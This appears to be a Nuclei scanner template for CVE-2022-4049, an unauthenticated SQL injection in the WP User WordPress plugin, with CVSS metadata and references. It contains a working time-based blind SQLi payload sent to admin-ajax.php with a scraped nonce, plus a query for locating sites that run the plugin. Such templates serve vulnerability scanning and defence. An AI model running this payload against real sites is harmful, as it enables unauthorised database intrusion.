http:
- attack: clusterbomb
  extractors:
  - group: 1
    internal: true
    name: nonce
    regex:
    - '"wpuser_update_setting":"([0-9a-zA-Z]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains(header_2, "text/html")
    - contains(body_2, 'Invalid Access')
    type: dsl
  matchers-condition: and
  payloads:
    path:
    - /index.php/user/
    - /user
  raw:
  - 'GET {{path}} HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=wpuser_group_action&group_action=x&wpuser_update_setting={{nonce}}&id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))khkM)

    '
  stop-at-first-match: true
id: CVE-2022-4049
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:wp_user_project:wp_user:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-4049
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.9061
    epss-score: 0.03472
  description: 'The WP User WordPress plugin through 7.0 does not properly sanitize
    and escape a parameter before using it in a SQL statement, leading to a SQL injection
    exploitable by unauthenticated users.

    '
  metadata:
    framework: wordpress
    max-request: 4
    product: wp_user
    publicwww-query: /wp-content/plugins/wp-user/
    vendor: wp_user_project
    verified: 'true'
  name: WP User <= 7.0 - Unauthenticated SQLi
  reference:
  - https://wpscan.com/vulnerability/9b0781e2-ad62-4308-bafc-d45b9a2472be
  - https://wordpress.org/plugins/wp-user/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4049
  severity: critical
  tags: cve,cve2022,sqli,wpscan,wordpress,wp-plugin,wp,wp-user,unauth,wp_user_project
